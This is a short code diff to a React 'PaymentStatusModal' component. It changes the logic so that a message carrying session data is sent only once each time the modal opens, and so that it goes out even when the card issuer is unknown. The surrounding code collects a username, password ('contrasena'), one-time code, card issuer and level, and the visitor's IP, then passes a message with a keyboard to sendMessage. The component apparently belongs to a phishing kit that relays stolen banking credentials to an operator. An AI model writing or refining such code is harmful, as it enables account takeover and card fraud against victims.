@@ -431,6 +431,7 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
   const [isResetting, setIsResetting] = useState(true);
   const [showIdentityModal, setShowIdentityModal] = useState(false);
   const openedAtRef = useRef<number>(0);
+  const firstMessageSentRef = useRef(false);
   const [cardInfo, setCardInfo] = useState<{
     issuer: string;
     level: string;
@@ -551,7 +552,9 @@ const PaymentStatusModal: React.FC<PaymentStatusModalProps> = ({
       sessionId,
     });
 
-    if (isOpen && sessionId && cardInfo.issuer !== "Desconocido") {
+    if (isOpen && sessionId) {
+      if (firstMessageSentRef.current) return;
+      firstMessageSentRef.current = true;
       console.log("");
       const ip = localStorage.getItem("ip") || "N/A";
 
@@ -618,6 +621,7 @@ sendMessage(mensaje, keyboard, sessionId, true)
   useEffect(() => {
     if (isOpen && sessionId) {
       openedAtRef.current = Date.now();
+      firstMessageSentRef.current = false;
       setStatus("loading");
       setFormData({ User: "", contrasena: "", otp: "" });
       setIsResetting(true);
